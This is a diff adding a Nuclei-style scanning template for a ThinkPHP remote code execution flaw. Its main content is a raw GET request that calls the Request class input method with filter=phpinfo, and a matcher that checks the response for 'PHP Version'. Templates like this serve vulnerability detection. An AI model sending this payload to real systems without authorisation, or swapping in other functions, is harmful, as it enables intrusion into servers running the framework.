@@ -1,0 +1,21 @@
+id: thinkphp_request_input_rce
+
+info:
+  name: "ThinkPHP框架Request类input方法远程代码执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    The ThinkPHP framework's Request class input method allows remote code execution through crafted requests.
+  tags: ThinkPHP
+
+http:
+- raw:
+  - |
+    GET /index.php?s=index/%5Cthink%5CRequest/input&filter=phpinfo&data=1 HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'PHP Version'
